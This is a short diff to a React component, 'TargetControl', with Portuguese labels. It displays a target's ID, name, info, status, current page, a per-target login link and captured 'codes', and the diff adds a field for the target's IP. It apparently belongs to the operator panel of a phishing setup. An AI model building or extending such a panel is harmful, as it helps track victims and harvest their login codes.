@@ -49,7 +49,7 @@ export function TargetControl() {
 
   if (!targetId || !targetData) return <p>Nenhum Target ativo</p>;
 
-  const { name, info, codes } = targetData;
+  const { name, info, codes, details } = targetData;
 
   const link = `${BASE_URL}/login/${targetId}`;
   const self = `${SELF_URL}/target-with-id/${targetData.playerId}/${targetId}`;
@@ -60,6 +60,7 @@ export function TargetControl() {
       <p><b>ID:</b> {targetId}</p>
       <p><b>Nome:</b> {name || "—"}</p>
       <p><b>Info:</b> {info || "—"}</p>
+      <p><b>Details/IP:</b> {details || "—"}</p>
       <p><b>Status:</b> {targetStatus}</p>
       <p><b>Página:</b> {targetPage}</p>
 
@@ -69,8 +70,6 @@ export function TargetControl() {
 
       <br /><br />
   
-      <p><b>Caso os dados acima não esteja atualizando, veja:</b> <a href={self} target="_blank" rel="noopener noreferrer">{self}</a></p>
-
       <br />
 
       {/* Codes */}
